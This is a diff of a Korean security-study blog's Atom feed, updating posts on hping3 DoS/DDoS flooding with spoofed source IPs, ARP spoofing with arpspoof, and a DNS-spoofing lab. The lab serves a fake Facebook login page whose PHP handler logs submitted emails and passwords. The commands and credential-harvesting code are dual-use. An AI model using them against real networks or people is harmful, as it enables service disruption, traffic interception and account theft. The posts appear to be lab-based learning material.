@@ -1,17 +1,39 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2020-11-05T03:40:47+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">개발새발</title><subtitle>Let's share even a little things.</subtitle><author><name>Joonsoo Park</name></author><entry><title type="html">DDoS 공격 - hping3</title><link href="http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Network-Attack-With-HPING3/" rel="alternate" type="text/html" title="DDoS 공격 - hping3" /><published>2020-11-05T00:00:00+00:00</published><updated>2020-11-05T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Network-Attack-With-HPING3</id><content type="html" xml:base="http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Network-Attack-With-HPING3/">&lt;font color=&quot;#ffcc66&quot;&gt;LAND Attack&lt;/font&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2020-11-05T08:05:18+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">개발새발</title><subtitle>Let's share even a little things.</subtitle><author><name>Joonsoo Park</name></author><entry><title type="html">DoS 공격 - LAND ATTACK, DDoS</title><link href="http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Network-Attack-With-HPING3/" rel="alternate" type="text/html" title="DoS 공격 - LAND ATTACK, DDoS" /><published>2020-11-05T00:00:00+00:00</published><updated>2020-11-05T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Network-Attack-With-HPING3</id><content type="html" xml:base="http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Network-Attack-With-HPING3/">&lt;p&gt;hping3를 이용해 DoS 공격을 시도해보자.&lt;/p&gt;
 
-&lt;p&gt;Land Attack이란 source ip(송신자의 ip)와 destination ip(수신자의 ip)를 같게 만들어 공격하는 방법이다. IP Spoofing을 이용한 공격이다.&lt;/p&gt;
+&lt;font color=&quot;#ffcc66&quot;&gt;DoS&lt;/font&gt;
+
+&lt;p&gt;Denial of Service의 약자로 피해자에게 과도한 트래픽을 줘서 정상적인 처리를 하지 못하도록 하는 것이다. 다양한 종류가 있으나 여기선 LAND Attack과 DDoS에 대해 알아보자.&lt;/p&gt;
+
+&lt;font color=&quot;#ffcc66&quot;&gt;LAND Attack&lt;/font&gt;
+
+&lt;p&gt;Land Attack이란 source ip(송신자의 ip)와 destination ip(수신자의 ip)를 같게 만들어 공격하는 방법이다. 자신의 IP를 변조해 공격을 하기 떄문에 이는 Ip Spoofing에 해당된다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hping3 -a [변조할 ip] [수신자의 ip] --icmp --flood &lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--flood&lt;/code&gt; : 좀 더 패킷을 빠르게 보내기 위해 사용하는 옵션&lt;/p&gt;
+
+&lt;font color=&quot;#ffcc66&quot;&gt;DDoS&lt;/font&gt;
+
+&lt;p&gt;Distributed Denial of Service 분산 서비스 거부 공격을 의미한다. 여러대의 공격자가 피해자에게 부하를 줘서 서비스를 정상적으로 하지 못하게 만드는 공격이다.&lt;/p&gt;
+
+&lt;p&gt;hping3의 rand 옵션을 사용해 source ip를 변조해 여러대의 PC에서 패킷을 전송한 것처럼 공격할 수 있다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;
+hping3 --rand-source --flood --icmp 192.168.8.131
+&lt;/code&gt;&lt;/p&gt;</content><author><name>Joonsoo Park</name></author><category term="정보보안" /><summary type="html">hping3를 이용해 DoS 공격을 시도해보자.</summary></entry><entry><title type="html">Spoofing</title><link href="http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Spoofing/" rel="alternate" type="text/html" title="Spoofing" /><published>2020-11-04T00:00:00+00:00</published><updated>2020-11-04T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Spoofing</id><content type="html" xml:base="http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Spoofing/">&lt;p&gt;Kali와 CentOS에서 ARP Spoofing과 DNS Spoofing을 실습해보자.&lt;/p&gt;
 
 &lt;font color=&quot;#ffcc66&quot;&gt;IP Spoofing&lt;/font&gt;
 &lt;p&gt;IP Spoofing이란 자신의 ip를 변조해 자신이 만든 패킷을 다른 컴퓨터가 만든 패킷처럼 만드는 것이다.&lt;/p&gt;
 
-&lt;p&gt;hping3 -a [변조할 ip] [수신자의 ip] --icmp --flood&lt;/p&gt;
+&lt;font color=&quot;#ffcc66&quot;&gt;Fragroute&lt;/font&gt;
 
-&lt;p&gt;--flood : 좀 더 패킷을 빠르게 보내기 위해 사용하는 옵션&lt;/p&gt;
+&lt;p&gt;포트 포워딩을 해주는 도구. 
+ARP Spoofing을 하게 되면 자신에게 패킷이 오게 되는데, 이후 다시 피해자가 지정한 곳에 피해자의 패킷을 보내주기 위해 사용한다. 만약 이를 사용하지 않으면 피해자의 패킷이 나에게만 오고 전달되야할 곳에 전달이 안되서 피해자가 정상적인 네트워크를 사용하지 못한다.&lt;/p&gt;
 
-&lt;p&gt;Ping of Death&lt;/p&gt;</content><author><name>Joonsoo Park</name></author><category term="정보보안" /><summary type="html">LAND Attack</summary></entry><entry><title type="html">ARP Spoofing - dnsniff</title><link href="http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/ARP-Spoofing-and-snort-rule/" rel="alternate" type="text/html" title="ARP Spoofing - dnsniff" /><published>2020-11-04T00:00:00+00:00</published><updated>2020-11-04T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/ARP-Spoofing-and-snort-rule</id><content type="html" xml:base="http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/ARP-Spoofing-and-snort-rule/">&lt;p&gt;ARP Spoofing&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fragroute -B1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;dnsniff&lt;/p&gt;
+&lt;font color=&quot;#ffcc66&quot;&gt;ARP Spoofing&lt;/font&gt;
 
 &lt;p&gt;VMWARE 등의 가상 장비를 사용해서 
 arp -a : 현재 MAC 테이블 확인&lt;/p&gt;
@@ -20,19 +42,64 @@ arp -a : 현재 MAC 테이블 확인&lt;/p&gt;
 
 &lt;p&gt;arpspoof -i [인터페이스 이름] [target ip] [gateway ip]&lt;/p&gt;
 
+&lt;p&gt;와이어샤크를 이용해 패킷을 확인해 보면 target에서 내 ip를 
+통해 패킷을 보내고 내 PC에서 게이트웨이에 다시 패킷을 보내 도청하고 있는 것을 알 수 있다. 여기서 응용해 DNS Spoofing을 해보자.&lt;/p&gt;
+
+&lt;font color=&quot;#ffcc66&quot;&gt;DNS Spoofing&lt;/font&gt;
+
+&lt;p&gt;공격자의 apache2를 실행해주고 피해자가 지정된 domain에 접근시 공격자의 html로 접근해 피해자가 입력하는 정보를 탈취하는 방법을 실습해보자.&lt;/p&gt;
+
+&lt;p&gt;facebook.html을 다운 받고 이를 /etc/www/html에 삽입해주자. 파일명은 index.html로 만들어주자. index.html에서 
+method 옆 action 기존 내용을 지우고 php파일을 삽입해주자.&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;action=&quot;post.php&quot; method=POST
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;action에 지정된 post.php 파일을 생성해 주자.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;post.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;print_r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;FILE_APPEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;refresh&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0; url=http://www.facebook.com&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;이 php는 post.txt에 피해자가 입력한 정보를 입력해주고 피해자를 다시 원래의 facebook으로 접속하게 해준다. 이제 dnsspoof를 이용하기 위해 host.txt 파일을 생성해 주자. dnsspoof의 경우 파일을 통해 호스트와 url을 지정해 줄 수 있다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[피해자 ip] *.facebook.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;그리고 이제 이 파일을 이용해서 dnsspoof 명령어를 실행해주자.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dnsspoof -i [인터페이스 이름] -f /경로/hosts.host
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;이제 피해자 PC에서 nscd를 이용해 dns를 초기화해줘야 한다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemctl restart nscd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;이 후에 피해자 컴퓨터에서 페이스북에 접근을 시도하면, 아까 지정해준 공격자의 index.html에 접근하게 되고 피해자가 e-mail과 비밀번호를 입력할 시 아까 생성한 post.txt에 입력된다.&lt;/p&gt;
+
+&lt;font color=&quot;#ffcc66&quot;&gt;이 방법이 성공하지 않을 수 있다.&lt;/font&gt;
+&lt;p&gt;이러한 공격을 막기 위해 웹 브라우저에서 자체적으로 보통 차단하기 때문에 성공하지 않을 수 있다. 만약에 이를 해결하는 경우 댓글로 알려주시면 감사하겠습니다.&lt;/p&gt;
+
+&lt;font color=&quot;#ffcc66&quot;&gt;네트워크 인터페이스가 다를 경우&lt;/font&gt;
+
 &lt;p&gt;VMware를 사용해 실습할 경우 각 OS의 네트워크 인터페이스가 다를 수가 있다. kali는 eth0인데 서버는 ens33이라던지. 이 경우 /etc/default/grub 파일을 수정해 주면 된다.(centOS 기준)
-GRUB_CMDLINE_LINUX
-/swap []net.ifnames=0] rhgb quite&lt;/p&gt;
+GRUB_CMDLINE_LINUX 부분에
+/swap 이 부분 뒤 &lt;font color=&quot;#ffcc66&quot;&gt; [net.ifnames=0] rhgb quite &lt;/font&gt; 이렇게 수정해주도록 하자.&lt;/p&gt;
 
-&lt;p&gt;# grub2-mkconfig -o /boot/grub2grub.cfg&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grub2-mkconfig -o /boot/grub2grub.cfg  
 
-&lt;p&gt;cd /etc/sysconfig/network-scripts&lt;/p&gt;
+cd /etc/sysconfig/network-scripts  
 
-&lt;p&gt;mv ifcfg-ens33 ifcfg-eth0&lt;/p&gt;
+mv ifcfg-ens33 ifcfg-eth0  
 
-&lt;p&gt;vi ifcfg-eth0&lt;/p&gt;
+vi ifcfg-eth0  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;그 후 재부팅 후 네트워크를 확인하면 이름이 변경된 것을 알 수 있다.&lt;/p&gt;</content><author><name>Joonsoo Park</name></author><category term="정보보안" /><summary type="html">ARP Spoofing</summary></entry><entry><title type="html">How to make a git blog</title><link href="http://0.0.0.0:4000/%EA%B9%83%20%EB%B8%94%EB%A1%9C%EA%B7%B8%20%EB%A7%8C%EB%93%A4%EA%B8%B0/How-to-make-a-git-blog/" rel="alternate" type="text/html" title="How to make a git blog" /><published>2020-11-02T00:00:00+00:00</published><updated>2020-11-02T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EA%B9%83%20%EB%B8%94%EB%A1%9C%EA%B7%B8%20%EB%A7%8C%EB%93%A4%EA%B8%B0/How-to-make-a-git-blog</id><content type="html" xml:base="http://0.0.0.0:4000/%EA%B9%83%20%EB%B8%94%EB%A1%9C%EA%B7%B8%20%EB%A7%8C%EB%93%A4%EA%B8%B0/How-to-make-a-git-blog/">&lt;p&gt;깃 블로그를 만들어보자.&lt;/p&gt;
+&lt;p&gt;생성된 ifcfg에서 name과 device 태그를 eth0로 변경해주자.
+재부팅 후 네트워크를 확인하면 이름이 변경된 것을 알 수 있다.&lt;/p&gt;</content><author><name>Joonsoo Park</name></author><category term="정보보안" /><summary type="html">Kali와 CentOS에서 ARP Spoofing과 DNS Spoofing을 실습해보자.</summary></entry><entry><title type="html">How to make a git blog</title><link href="http://0.0.0.0:4000/%EA%B9%83%20%EB%B8%94%EB%A1%9C%EA%B7%B8%20%EB%A7%8C%EB%93%A4%EA%B8%B0/How-to-make-a-git-blog/" rel="alternate" type="text/html" title="How to make a git blog" /><published>2020-11-02T00:00:00+00:00</published><updated>2020-11-02T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EA%B9%83%20%EB%B8%94%EB%A1%9C%EA%B7%B8%20%EB%A7%8C%EB%93%A4%EA%B8%B0/How-to-make-a-git-blog</id><content type="html" xml:base="http://0.0.0.0:4000/%EA%B9%83%20%EB%B8%94%EB%A1%9C%EA%B7%B8%20%EB%A7%8C%EB%93%A4%EA%B8%B0/How-to-make-a-git-blog/">&lt;p&gt;깃 블로그를 만들어보자.&lt;/p&gt;
 
 &lt;p&gt;깃 블로그를 만드는 방법은 매우 쉬워보이고 실제로 쉽기도 하다.
 모두가 가지고 있는 블로그를 생성해보고 원하는 것을 공유해보자!&lt;/p&gt;
